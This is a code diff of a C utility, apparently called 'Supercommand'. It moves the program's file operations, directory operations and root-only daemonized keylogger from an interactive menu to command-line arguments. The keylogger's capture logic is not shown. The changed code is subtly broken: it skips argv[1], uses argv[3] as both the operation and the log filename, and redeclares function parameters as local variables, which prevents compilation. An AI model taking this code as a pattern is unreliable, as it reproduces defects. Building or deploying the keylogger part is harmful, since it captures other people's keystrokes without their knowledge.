@@ -19,54 +19,47 @@ void directory_operations();
 void start_keylogger();
 void stop_keylogger(int sig);
 
-int main()
+int main(int argc, char *argv[])
 {
 
-    int choice;
+    int mode = atoi(argv[2]);
+    int operation = atoi(argv[3]);
+    char *parameter = argv[4];
 
-    while (1)
+    switch (mode)
     {
-        printf("=======================\n");
-        printf("Supercommand Menu:\n");
-        printf("1. File operations\n");
-        printf("2. Directory operations\n");
-        printf("3. Keylogger\n");
-        printf("4. Exit\n");
-        printf("Enter your choice: ");
-        scanf("%d", &choice);
+    case 1: // File operations
+        file_operations(operation, parameter);
+        break;
+    case 2: // Directory operations
+        directory_operations(operation, parameter);
+        break;
+    case 3: // Keylogger
 
-        printf("\n");
-
-        switch (choice)
+        if (geteuid() != 0)
         {
-        case 1:
-            file_operations();
-            break;
-        case 2:
-            directory_operations();
-            break;
-        case 3:
-            if (geteuid() != 0)
-            {
-                fprintf(stderr, "[-] Please run the program as root\n");
-                exit(EXIT_FAILURE);
-            }
-            start_keylogger();
-            break;
-        case 4:
-            exit(0);
-        default:
-            printf("[-] Invalid choice. Please try again.\n");
+            fprintf(stderr, "[-] Please run the program as root\n");
+            exit(EXIT_FAILURE);
         }
 
-        printf("\n");
+        char *log_filename = argv[3];
+        if (strchr(log_filename, '/') != NULL)
+        {
+            fprintf(stderr, "[-] Log filename should not be a path. Please provide a valid filename. Your log file will store in the root directory.\n");
+            exit(EXIT_FAILURE);
+        }
+        start_keylogger(log_filename);
+        break;
+    default:
+        fprintf(stderr, "[-] Invalid mode. Please use 1 for file, 2 for directory, or 3 for keylogger.\n");
+        exit(EXIT_FAILURE);
     }
 
     return 0;
 }
 
 
-void file_operations()
+void file_operations(int mode, char *filename)
 {
     int choice;
     char filename[256];
@@ -214,7 +207,7 @@ void file_operations()
 }
 
 
-void directory_operations()
+void directory_operations(int mode, char *path)
 {
     int choice;
     char dirname[256];
@@ -543,7 +536,7 @@ void daemonize(char *log_filename)
     open("/dev/null", O_WRONLY); // stderr
 }
 
-void start_keylogger()
+void start_keylogger(char *log_filename)
 {
 
     char log_filename[256];
